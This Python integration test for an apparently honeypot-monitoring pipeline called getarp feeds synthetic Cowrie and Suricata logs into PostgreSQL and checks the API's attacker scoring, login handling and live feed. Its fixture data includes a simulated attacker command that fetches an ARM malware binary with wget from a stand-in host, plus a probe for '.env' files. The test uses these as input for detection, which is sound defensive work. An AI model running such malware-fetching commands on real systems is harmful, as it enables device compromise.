"""End-to-end test: logs -> pipeline -> PostgreSQL -> API.

Needs a PostgreSQL server and a superuser DSN in GETARP_TEST_ADMIN_DSN, e.g.
    postgresql://postgres:pw@127.0.0.1:5432/postgres
Creates (and drops) a database "getarp_test". TimescaleDB is used if present.
Run from the repository root:  python app/tests/integration.py
"""
import asyncio
import json
import os
import random
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone

import asyncpg
import bcrypt

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ADMIN_DSN = os.environ["GETARP_TEST_ADMIN_DSN"]
PORT = 18000 + random.randint(0, 999)
fails = []


def check(cond, what):
    print(("  ok    " if cond else "  FAIL  ") + what)
    if not cond:
        fails.append(what)


def make_geoip(directory):
    try:
        from mmdb_writer import MMDBWriter
        from netaddr import IPSet
    except ImportError:
        print("  (mmdb_writer not installed: no country/AS data in this run)")
        return
    c = MMDBWriter(ip_version=4, database_type="DBIP-Country-Lite")
    a = MMDBWriter(ip_version=4, database_type="DBIP-ASN-Lite")
    for net, cc, asn, org in [("45.0.0.0/8", "HK", 4134, "DigitalLink Global"),
                              ("124.0.0.0/8", "CN", 4837, "CT HangZhou IDC"),
                              ("46.0.0.0/8", "DE", 14061, "DigitalOcean, LLC")]:
        c.insert_network(IPSet([net]), {"country": {"iso_code": cc}})
        a.insert_network(IPSet([net]), {"autonomous_system_number": asn,
                                        "autonomous_system_organization": org})
    c.to_db_file(os.path.join(directory, "dbip-country-lite.mmdb"))
    a.to_db_file(os.path.join(directory, "dbip-asn-lite.mmdb"))


def write_logs(logs, start):
    def line(f, rec):
        f.write(json.dumps(rec) + "\n")
    with open(os.path.join(logs, "cowrie.json"), "a") as f:
        t = start
        # a brute-forcer that gets in and drops malware
        for i in range(15):
            t += timedelta(seconds=1)
            line(f, {"eventid": "cowrie.login.failed", "src_ip": "45.202.199.98", "dst_port": 2222,
                     "protocol": "ssh", "session": "a1", "username": "root", "password": f"pw{i}",
                     "timestamp": t.isoformat(), "getarp_sensor": "s01"})
        for eid, extra in [("cowrie.session.connect", {}),
                           ("cowrie.login.success", {"username": "root", "password": "admin"}),
                           ("cowrie.command.input", {"input": "uname -a"}),
                           ("cowrie.command.input", {"input": "cd /tmp; wget http://198.51.100.9/x.arm7"}),
                           ("cowrie.session.file_download", {"url": "http://198.51.100.9/x.arm7"})]:
            t += timedelta(seconds=1)
            line(f, {"eventid": eid, "src_ip": "45.202.199.98", "dst_port": 2222, "protocol": "ssh",
                     "session": "a2", "timestamp": t.isoformat(), "getarp_sensor": "s01", **extra})
        # many probers
        for n in range(200):
            line(f, {"eventid": "cowrie.session.connect", "src_ip": f"124.248.{n // 250}.{n % 250 + 1}",
                     "dst_port": 2223, "protocol": "telnet", "session": f"p{n}",
                     "timestamp": (start + timedelta(seconds=n)).isoformat(), "getarp_sensor": "s02"})
        line(f, {"eventid": "cowrie.session.connect", "src_ip": "10.0.0.2", "dst_port": 2222,
                 "timestamp": start.isoformat(), "getarp_sensor": "s01"})   # private: ignored
        f.write("not json\n")
    with open(os.path.join(logs, "eve.json"), "a") as f:
        for port in (22, 23, 21, 3306, 6379):
            line(f, {"event_type": "alert", "timestamp": start.isoformat(), "src_ip": "46.101.137.209",
                     "src_port": 50000, "dest_ip": "172.31.1.5", "dest_port": port,
                     "alert": {"signature": "ET SCAN Suspicious inbound", "severity": 2},
                     "getarp_sensor": "s02"})
    with open(os.path.join(logs, "extra.json"), "a") as f:
        line(f, {"ts": start.isoformat(), "service": "http", "dst_port": 8080, "src_ip": "46.101.137.209",
                 "event_type": "connect", "command": "GET /.env", "getarp_sensor": "s01"})


def http(method, path, body=None, cookie=None):
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}{path}", method=method,
                                 data=json.dumps(body).encode() if body is not None else None,
                                 headers={"Content-Type": "application/json",
                                          **({"Cookie": cookie} if cookie else {})})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read() or b"null"), r.headers
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"null"), e.headers


async def main():
    tmp = tempfile.mkdtemp()
    logs, state, geo = (os.path.join(tmp, d) for d in ("logs", "state", "geo"))
    for d in (logs, state, geo):
        os.makedirs(d)
    make_geoip(geo)

    admin = await asyncpg.connect(ADMIN_DSN)
    await admin.execute("DROP DATABASE IF EXISTS getarp_test")
    await admin.execute("CREATE DATABASE getarp_test")
    await admin.execute("DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname='getarp_test') "
                        "THEN CREATE ROLE getarp_test LOGIN PASSWORD 'getarp_test'; END IF; END $$")
    await admin.close()
    db = await asyncpg.connect(ADMIN_DSN.rsplit("/", 1)[0] + "/getarp_test")
    for name in sorted(os.listdir(os.path.join(ROOT, "migrations"))):
        await db.execute(open(os.path.join(ROOT, "migrations", name)).read())
    await db.execute("GRANT ALL ON ALL TABLES IN SCHEMA public TO getarp_test;"
                     "GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO getarp_test")
    await db.execute("INSERT INTO users VALUES ('admin', $1)",
                     bcrypt.hashpw(b"correct horse battery", bcrypt.gensalt()).decode())
    print("schema applied; TimescaleDB:",
          await db.fetchval("SELECT count(*) > 0 FROM pg_extension WHERE extname = 'timescaledb'"))

    host = ADMIN_DSN.split("@", 1)[1].split("/", 1)[0].split(":")
    env = dict(os.environ, PG_USER="getarp_test", PG_PASSWORD="getarp_test", PG_HOST=host[0],
               PG_PORT=host[1] if len(host) > 1 else "5432", PG_DB="getarp_test", LOG_DIR=logs,
               STATE_DIRECTORY=state, GEOIP_DIR=geo, SESSION_SECRET="test-secret",
               PYTHONPATH=ROOT)
    start = datetime.now(timezone.utc) - timedelta(minutes=3)
    write_logs(logs, start)

    procs = [subprocess.Popen([sys.executable, "-m", "getarp.pipeline"], env=env, cwd=ROOT),
             subprocess.Popen([sys.executable, "-m", "uvicorn", "getarp.api:app", "--port", str(PORT),
                               "--log-level", "warning"], env=env, cwd=ROOT)]
    try:
        await asyncio.sleep(4)
        print("pipeline")
        check(await db.fetchval("SELECT count(*) FROM events") == 226, "226 events stored (private + junk skipped)")
        ip = await db.fetchrow("SELECT * FROM ips WHERE src_ip = '45.202.199.98'")
        check(ip and ip["class"] == "exploiter" and ip["score"] >= 85, "attacker classed exploiter, score >= 85")
        check(ip and ip["country"] == "HK" and ip["as_org"] == "DigitalLink Global", "country and AS from DB-IP data")
        check(ip and ip["sensors"] == ["s01"] and ip["ports"] == [22], "sensors and real ports recorded")
        kinds = {r["type"] for r in await db.fetch("SELECT type FROM findings")}
        check({"bruteforce", "access", "command_exec", "malware_download", "ids_alert",
               "service_sweep"} <= kinds, f"findings: {sorted(kinds)}")
        prof = await db.fetchrow("SELECT * FROM profiles WHERE src_ip = '45.202.199.98'")
        check(prof and prof["commands"][:1] == ["uname -a"] and "mirai" in prof["tooling"],
              "profile has commands and tooling")
        check(await db.fetchval("SELECT count(*) FROM ips") == 202, "202 tracked hosts")
        check(await db.fetchval("SELECT count(*) FROM status") >= 1, "status snapshot written")

        print("api")
        code, st, _ = http("GET", "/api/status")
        check(code == 200 and st["tracked_hosts"] == 202 and st["live_attackers"] >= 3, "status")
        code, top, _ = http("GET", "/api/ips?limit=5")
        check(code == 200 and top[0]["ip"] == "45.202.199.98", f"top attackers by score {top[:2]}")
        code, cc, _ = http("GET", "/api/top-countries?window=1h")
        check(code == 200 and cc[0]["country"] == "CN" and cc[0]["ips"] == 200, "top countries")
        code, asn, _ = http("GET", "/api/top-as?window=24h")
        check(code == 200 and asn[0]["asn"] == 4837, "top AS")
        code, att, _ = http("GET", "/api/findings?kind=attack&window=24h")
        check(code == 200 and len(att) >= 4, "attacks list")
        code, beh, _ = http("GET", "/api/behavior?window=24h")
        check(code == 200 and beh[0]["ip"] == "45.202.199.98", "behaviour list")
        check(http("GET", "/api/findings?window=1y")[0] == 400, "bad window refused")
        check(http("GET", "/api/ips/45.202.199.98")[0] == 401, "IP detail needs log-in")
        check(http("POST", "/api/auth/login", {"username": "admin", "password": "nope"})[0] == 401,
              "wrong password refused")
        code, _, headers = http("POST", "/api/auth/login",
                                {"username": "admin", "password": "correct horse battery"})
        cookie = (headers.get("set-cookie") or "").split(";", 1)[0]
        check(code == 200 and "HttpOnly" in headers.get("set-cookie", ""), "log-in sets an HttpOnly cookie")
        code, det, _ = http("GET", "/api/ips/45.202.199.98", cookie=cookie)
        check(code == 200 and len(det["events"]) == 20 and det["profile"]["sessions"] == 1, "IP detail")
        check(http("GET", "/api/me", cookie=cookie + "x")[0] == 401, "tampered cookie refused")

        print("restart and rotation")
        procs[0].send_signal(signal.SIGTERM)
        procs[0].wait(10)
        os.rename(os.path.join(logs, "cowrie.json"), os.path.join(logs, "cowrie.json.1"))
        with open(os.path.join(logs, "cowrie.json.1"), "a") as f:   # written just before rotation
            f.write(json.dumps({"eventid": "cowrie.session.connect", "src_ip": "46.101.1.1",
                                "dst_port": 2222, "timestamp": start.isoformat(),
                                "getarp_sensor": "s01"}) + "\n")
        with open(os.path.join(logs, "cowrie.json"), "w") as f:
            f.write(json.dumps({"eventid": "cowrie.session.connect", "src_ip": "46.101.1.2",
                                "dst_port": 2222, "timestamp": start.isoformat(),
                                "getarp_sensor": "s01"}) + "\n")
        procs[0] = subprocess.Popen([sys.executable, "-m", "getarp.pipeline"], env=env, cwd=ROOT)
        await asyncio.sleep(4)
        check(await db.fetchval("SELECT count(*) FROM events") == 228,
              "after restart + rotation: both new lines stored once, nothing repeated")

        print("live feed")
        import websockets
        async with websockets.connect(f"ws://127.0.0.1:{PORT}/api/ws") as ws:
            await asyncio.sleep(0.5)
            with open(os.path.join(logs, "cowrie.json"), "a") as f:
                f.write(json.dumps({"eventid": "cowrie.session.file_download", "src_ip": "46.101.9.9",
                                    "dst_port": 2222, "url": "http://198.51.100.7/bot",
                                    "timestamp": datetime.now(timezone.utc).isoformat(),
                                    "getarp_sensor": "s01"}) + "\n")
            try:
                msg = json.loads(await asyncio.wait_for(ws.recv(), 10))
            except asyncio.TimeoutError:
                msg = {}
            check(msg.get("label") == "malware_download" and msg.get("src_ip") == "46.101.9.9",
                  "browser gets the new finding over the websocket")

        print("load")
        t = time.monotonic()
        with open(os.path.join(logs, "cowrie.json"), "a") as f:
            for n in range(20000):
                f.write(json.dumps({"eventid": "cowrie.login.failed", "src_ip": f"45.{n % 200}.1.{n % 250 + 1}",
                                    "dst_port": 2222, "protocol": "ssh", "username": "root",
                                    "password": str(n), "timestamp": datetime.now(timezone.utc).isoformat(),
                                    "getarp_sensor": "s03"}) + "\n")
        while await db.fetchval("SELECT count(*) FROM events") < 20229 and time.monotonic() - t < 60:
            await asyncio.sleep(0.5)
        took = time.monotonic() - t
        check(await db.fetchval("SELECT count(*) FROM events") == 20229, f"20,000 events in {took:.1f}s "
              f"({20000 / took:.0f}/s)")
    finally:
        for p in procs:
            p.terminate()
        for p in procs:
            p.wait(10)
        await db.close()
        admin = await asyncpg.connect(ADMIN_DSN)
        await admin.execute("DROP DATABASE IF EXISTS getarp_test WITH (FORCE)")
        await admin.close()
        shutil.rmtree(tmp, ignore_errors=True)
    print("FAILED: " + "; ".join(fails) if fails else "all integration checks passed")
    sys.exit(1 if fails else 0)


if __name__ == "__main__":
    asyncio.run(main())
